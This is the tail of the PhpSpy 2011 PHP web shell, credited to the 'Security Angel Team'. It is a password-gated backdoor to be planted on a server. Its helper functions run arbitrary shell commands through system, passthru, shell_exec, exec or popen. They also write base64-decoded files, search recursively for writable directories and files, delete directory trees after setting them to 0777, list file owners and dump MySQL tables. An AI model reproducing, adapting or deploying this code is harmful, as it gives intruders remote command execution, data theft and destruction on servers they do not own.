	m('Undefined Action');
}

?>
</td></tr></table>
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
	<span style="float:right;"><?php debuginfo();ob_end_flush();?></span>
	Powered by <a title="Build 20110502" href="http://www.4ngel.net" target="_blank"><?php echo str_replace('.','','P.h.p.S.p.y');?> 2011</a>. Copyright (C) 2004-2011 <a href="http://www.4ngel.net" target="_blank">Security Angel Team [S4T]</a> All Rights Reserved.
</div>
</body>
</html>

<?php

/*======================================================
函数库
======================================================*/

function secparam($n, $v) {
	$v = trim($v);
	if($v) {
		p('<h2>'.$n.' &raquo;</h2>');
		p('<div class="infolist">');
		if(strpos($v, "\n") === false)
			p($v.'<br />');
		else
			p('<pre>'.$v.'</pre>');
		p('</div>');
	}
}
function m($msg) {
	echo '<div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;">';
	echo $msg;
	echo '</div>';
}
function scookie($key, $value, $life = 0, $prefix = 1) {
	global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookielife;
	$key = ($prefix ? $cookiepre : '').$key;
	$life = $life ? $life : $cookielife;
	$useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
	setcookie($key, $value, $timestamp+$life, $cookiepath, $cookiedomain, $useport);
}	
function multi($num, $perpage, $curpage, $tablename) {
	$multipage = '';
	if($num > $perpage) {
		$page = 10;
		$offset = 5;
		$pages = @ceil($num / $perpage);
		if($page > $pages) {
			$from = 1;
			$to = $pages;
		} else {
			$from = $curpage - $offset;
			$to = $curpage + $page - $offset - 1;
			if($from < 1) {
				$to = $curpage + 1 - $from;
				$from = 1;
				if(($to - $from) < $page && ($to - $from) < $pages) {
					$to = $page;
				}
			} elseif($to > $pages) {
				$from = $curpage - $pages + $to;
				$to = $pages;
				if(($to - $from) < $page && ($to - $from) < $pages) {
					$from = $pages - $page + 1;
				}
			}
		}
		$multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\''.$tablename.'\', \'\', 1);">First</a> ' : '').($curpage > 1 ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage - 1).');">Prev</a> ' : '');
		for($i = $from; $i <= $to; $i++) {
			$multipage .= $i == $curpage ? $i.' ' : '<a href="javascript:settable(\''.$tablename.'\', \'\', '.$i.');">['.$i.']</a> ';
		}
		$multipage .= ($curpage < $pages ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage + 1).');">Next</a>' : '').($to < $pages ? ' <a href="javascript:settable(\''.$tablename.'\', \'\', '.$pages.');">Last</a>' : '');
		$multipage = $multipage ? '<p>Pages: '.$multipage.'</p>' : '';
	}
	return $multipage;
}
// 登陆入口
function loginpage() {
?>
	<style type="text/css">
	input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
	</style>
	<form method="POST" action="">
	<span style="font:11px Verdana;">Password: </span><input name="password" type="password" size="20">
	<input type="hidden" name="action" value="login">
	<input type="submit" value="Login">
	</form>
<?php
	exit;
}//end loginpage()

function execute($cfe) {
	$res = '';
	if ($cfe) {
		if(function_exists('system')) {
			@ob_start();
			@system($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		} elseif(function_exists('passthru')) {
			@ob_start();
			@passthru($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		} elseif(function_exists('shell_exec')) {
			$res = @shell_exec($cfe);
		} elseif(function_exists('exec')) {
			@exec($cfe,$res);
			$res = join("\n",$res);
		} elseif(@is_resource($f = @popen($cfe,"r"))) {
			$res = '';
			while(!@feof($f)) {
				$res .= @fread($f,1024); 
			}
			@pclose($f);
		}
	}
	return $res;
}
function which($pr) {
	$path = execute("which $pr");
	return ($path ? $path : $pr); 
}

function cf($fname,$text){
	if($fp=@fopen($fname,'w')) {
		@fputs($fp,@base64_decode($text));
		@fclose($fp);
	}
}
function dirsize($dir) { 
	$dh = @opendir($dir);
	$size = 0;
	while($file = @readdir($dh)) {
		if ($file != '.' && $file != '..') {
			$path = $dir.'/'.$file;
			$size += @is_dir($path) ? dirsize($path) : @filesize($path);
		}
	}
	@closedir($dh);
	return $size;
}
// 页面调试信息
function debuginfo() {
	global $starttime;
	$mtime = explode(' ', microtime());
	$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
	echo 'Processed in '.$totaltime.' second(s)';
}

//连接MYSQL数据库
function mydbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {
	global $charsetdb;
	@ini_set('mysql.connect_timeout', 5);
	if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {
		p('<h2>Can not connect to MySQL server</h2>');
		exit;
	}
	if($link && $dbname) {
		if (!@mysql_select_db($dbname, $link)) {
			p('<h2>Database selected has error</h2>');
			exit;
		}
	}
	if($link && mysql_get_server_info() > '4.1') {
		if($charset && in_array(strtolower($charset), $charsetdb)) {
			q("SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;", $link);
		}
	}
	return $link;
}

// 去掉转义字符
function s_array(&$array) {
	if (is_array($array)) {
		foreach ($array as $k => $v) {
			$array[$k] = s_array($v);
		}
	} else if (is_string($array)) {
		$array = stripslashes($array);
	}
	return $array;
}

// 清除HTML代码
function html_clean($content) {
	$content = htmlspecialchars($content);
	$content = str_replace("\n", "<br />", $content);
	$content = str_replace("  ", "&nbsp;&nbsp;", $content);
	$content = str_replace("\t", "&nbsp;&nbsp;&nbsp;&nbsp;", $content);
	return $content;
}

// 获取权限
function getChmod($filepath){
	return substr(base_convert(@fileperms($filepath),10,8),-4);
}

function getPerms($filepath) {
	$mode = @fileperms($filepath);
	if (($mode & 0xC000) === 0xC000) {$type = 's';}
	elseif (($mode & 0x4000) === 0x4000) {$type = 'd';}
	elseif (($mode & 0xA000) === 0xA000) {$type = 'l';}
	elseif (($mode & 0x8000) === 0x8000) {$type = '-';} 
	elseif (($mode & 0x6000) === 0x6000) {$type = 'b';}
	elseif (($mode & 0x2000) === 0x2000) {$type = 'c';}
	elseif (($mode & 0x1000) === 0x1000) {$type = 'p';}
	else {$type = '?';}

	$owner['read'] = ($mode & 00400) ? 'r' : '-'; 
	$owner['write'] = ($mode & 00200) ? 'w' : '-'; 
	$owner['execute'] = ($mode & 00100) ? 'x' : '-'; 
	$group['read'] = ($mode & 00040) ? 'r' : '-'; 
	$group['write'] = ($mode & 00020) ? 'w' : '-'; 
	$group['execute'] = ($mode & 00010) ? 'x' : '-'; 
	$world['read'] = ($mode & 00004) ? 'r' : '-'; 
	$world['write'] = ($mode & 00002) ? 'w' : '-'; 
	$world['execute'] = ($mode & 00001) ? 'x' : '-'; 

	if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}
	if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}
	if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}
 
	return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
}

function getUser($filepath)	{
	if (function_exists('posix_getpwuid')) {
		$array = @posix_getpwuid(@fileowner($filepath));
		if ($array && is_array($array)) {
			return ' / <a href="#" title="User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'">'.$array['name'].'</a>';
		}
	}
	return '';
}

// 删除目录
function deltree($deldir) {
	$mydir=@dir($deldir);	
	while($file=$mydir->read())	{ 		
		if((is_dir($deldir.'/'.$file)) && ($file!='.') && ($file!='..')) { 
			@chmod($deldir.'/'.$file,0777);
			deltree($deldir.'/'.$file); 
		}
		if (is_file($deldir.'/'.$file)) {
			@chmod($deldir.'/'.$file,0777);
			@unlink($deldir.'/'.$file);
		}
	} 
	$mydir->close(); 
	@chmod($deldir,0777);
	return @rmdir($deldir) ? 1 : 0;
}

// 表格行间的背景色替换
function bg() {
	global $bgc;
	return ($bgc++%2==0) ? 'alt1' : 'alt2';
}

// 获取当前的文件系统路径
function getPath($scriptpath, $nowpath) {
	if ($nowpath == '.') {
		$nowpath = $scriptpath;
	}
	$nowpath = str_replace('\\', '/', $nowpath);
	$nowpath = str_replace('//', '/', $nowpath);
	if (substr($nowpath, -1) != '/') {
		$nowpath = $nowpath.'/';
	}
	return $nowpath;
}

// 获取当前目录的上级目录
function getUpPath($nowpath) {
	$pathdb = explode('/', $nowpath);
	$num = count($pathdb);
	if ($num > 2) {
		unset($pathdb[$num-1],$pathdb[$num-2]);
	}
	$uppath = implode('/', $pathdb).'/';
	$uppath = str_replace('//', '/', $uppath);
	return $uppath;
}

// 检查PHP配置参数
function getcfg($varname) {
	$result = get_cfg_var($varname);
	if ($result == 0) {
		return 'No';
	} elseif ($result == 1) {
		return 'Yes';
	} else {
		return $result;
	}
}

// 检查函数情况
function getfun($funName) {
	return (false !== function_exists($funName)) ? 'Yes' : 'No';
}

// 获得文件扩展名
function getext($file) {
	$info = pathinfo($file);
	return $info['extension'];
}

function GetWDirList($dir){
	global $dirdata,$j,$nowpath;
	!$j && $j=1;
	if ($dh = opendir($dir)) {
		while ($file = readdir($dh)) {
			$f=str_replace('//','/',$dir.'/'.$file);
			if($file!='.' && $file!='..' && is_dir($f)){
				if (is_writable($f)) {
					$dirdata[$j]['filename']=str_replace($nowpath,'',$f);
					$dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
					$dirdata[$j]['dirchmod']=getChmod($f);
					$dirdata[$j]['dirperm']=getPerms($f);
					$dirdata[$j]['dirlink']=$dir;
					$dirdata[$j]['server_link']=$f;
					$j++;
				}
				GetWDirList($f);
			}
		}
		closedir($dh);
		clearstatcache();
		return $dirdata;
	} else {
		return array();
	}
}

function GetWFileList($dir){
	global $filedata,$j,$nowpath, $writabledb;
	!$j && $j=1;
	if ($dh = opendir($dir)) {
		while ($file = readdir($dh)) {
			$ext = getext($file);
			$f=str_replace('//','/',$dir.'/'.$file);
			if($file!='.' && $file!='..' && is_dir($f)){
				GetWFileList($f);
			} elseif($file!='.' && $file!='..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
				if (is_writable($f)) {
					$filedata[$j]['filename']=str_replace($nowpath,'',$f);
					$filedata[$j]['size']=sizecount(@filesize($f));
					$filedata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
					$filedata[$j]['filechmod']=getChmod($f);
					$filedata[$j]['fileperm']=getPerms($f);
					$filedata[$j]['fileowner']=getUser($f);
					$filedata[$j]['dirlink']=$dir;
					$filedata[$j]['server_link']=$f;
					$j++;
				}
			}
		}
		closedir($dh);
		clearstatcache();
		return $filedata;
	} else {
		return array();
	}
}

function GetSFileList($dir, $content, $re = 0) {
	global $filedata,$j,$nowpath, $writabledb;
	!$j && $j=1;
	if ($dh = opendir($dir)) {
		while ($file = readdir($dh)) {
			$ext = getext($file);
			$f=str_replace('//','/',$dir.'/'.$file);
			if($file!='.' && $file!='..' && is_dir($f)){
				GetSFileList($f, $content, $re = 0);
			} elseif($file!='.' && $file!='..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
				$find = 0;
				if ($re) {
					if ( preg_match('@'.$content.'@',$file) || preg_match('@'.$content.'@', @file_get_contents($f)) ){
						$find = 1;
					}
				} else {
					if ( strstr($file, $content) || strstr( @file_get_contents($f),$content ) ) {
						$find = 1;
					}
				}
				if ($find) {
					$filedata[$j]['filename']=str_replace($nowpath,'',$f);
					$filedata[$j]['size']=sizecount(@filesize($f));
					$filedata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
					$filedata[$j]['filechmod']=getChmod($f);
					$filedata[$j]['fileperm']=getPerms($f);
					$filedata[$j]['fileowner']=getUser($f);
					$filedata[$j]['dirlink']=$dir;
					$filedata[$j]['server_link']=$f;
					$j++;
				}
			}
		}
		closedir($dh);
		clearstatcache();
		return $filedata;
	} else {
		return array();
	}
}

function qy($sql) { 
	global $mysqllink;
	//echo $sql.'<br>';
	$res = $error = '';
	if(!$res = @mysql_query($sql,$mysqllink)) { 
		return 0;
	} else if(is_resource($res)) {
		return 1; 
	} else {
		return 2;
	}	
	return 0;
}

function q($sql) { 
	global $mysqllink;
	return @mysql_query($sql,$mysqllink);
}

function fr($qy){
	mysql_free_result($qy);
}

function sizecount($fileSize) {
	$size = sprintf("%u", $fileSize);
	if($size == 0) {
		return '0 Bytes' ;
	}
	$sizename = array(' Bytes', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
	return round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];
}
// 备份数据库
function sqldumptable($table, $fp=0) {
	global $mysqllink;

	$tabledump = "DROP TABLE IF EXISTS `$table`;\n";
	$res = q("SHOW CREATE TABLE $table");
	$create = mysql_fetch_row($res);
	$tabledump .= $create[1].";\n\n";

	if ($fp) {
		fwrite($fp,$tabledump);
	} else {
		echo $tabledump;
	}
	$tabledump = '';
	$rows = q("SELECT * FROM $table");
	while ($row = mysql_fetch_assoc($rows)) {
		foreach($row as $k=>$v) {
			$row[$k] = "'".@mysql_real_escape_string($v)."'";
		}
		$tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(", ", $row).');'."\n";
		if ($fp) {
			fwrite($fp,$tabledump);
		} else {
			echo $tabledump;
		}
	}
	fwrite($fp,"\n\n");
	fr($rows);
}

function p($str){
	echo $str."\n";
}

function tbhead() {
	p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');
}
function tbfoot(){
	p('</table>');
}

function makehide($name,$value=''){
	p("<input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" />");
}

function makeinput($arg = array()){
	$arg['size'] = $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
	$arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
	!$arg['type'] && $arg['type'] = 'text';
	$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
	$arg['class'] = $arg['class'] ? $arg['class'] : 'input';
	if ($arg['newline']) {
		p("<p>$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /></p>");
	} else {
		p("$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] />");
	}
}

function makeselect($arg = array()){
	if ($arg['onchange']) {
		$onchange = 'onchange="'.$arg['onchange'].'"';
	}
	$arg['title'] = $arg['title'] ? $arg['title'] : '';
	if ($arg['newline']) p('<p>');
	p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
		if (is_array($arg['option'])) {
			if ($arg['nokey']) {
				foreach ($arg['option'] as $value) {
					if ($arg['selected']==$value) {
						p("<option value=\"$value\" selected>$value</option>");
					} else {
						p("<option value=\"$value\">$value</option>");
					}
				}
			} else {
				foreach ($arg['option'] as $key=>$value) {
					if ($arg['selected']==$key) {
						p("<option value=\"$key\" selected>$value</option>");
					} else {
						p("<option value=\"$key\">$value</option>");
					}
				}
			}
		}
	p("</select>");
	if ($arg['newline']) p('</p>');
}
function formhead($arg = array()) {
	global $self;
	!$arg['method'] && $arg['method'] = 'post';
	!$arg['action'] && $arg['action'] = $self;
	$arg['target'] = $arg['target'] ? "target=\"$arg[target]\"" : '';
	!$arg['name'] && $arg['name'] = 'form1';
	p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]>");
	if ($arg['title']) {
		p('<h2>'.$arg['title'].' &raquo;</h2>');
	}
}
	
function maketext($arg = array()){
	!$arg['cols'] && $arg['cols'] = 100;
	!$arg['rows'] && $arg['rows'] = 25;
	$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
	p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>$arg[value]</textarea></p>");
}

function formfooter($name = ''){
	!$name && $name = 'submit';
	p('<p><input class="bt" name="'.$name.'" id="'.$name.'" type="submit" value="Submit"></p>');
	p('</form>');
}

function goback(){
	global $self, $nowpath;
	p('<form action="'.$self.'" method="post"><input type="hidden" name="action" value="file" /><input type="hidden" name="dir" value="'.$nowpath.'" /><p><input class="bt" type="submit" value="Go back..."></p></form>');
}

function formfoot(){
	p('</form>');
}

function encode_pass($pass) {
	$pass = md5('angel'.$pass);
	$pass = md5($pass.'angel');
	$pass = md5('angel'.$pass.'angel');
	return $pass;
}

function pr($s){
	echo "<pre>".print_r($s).'</pre>';
}

?>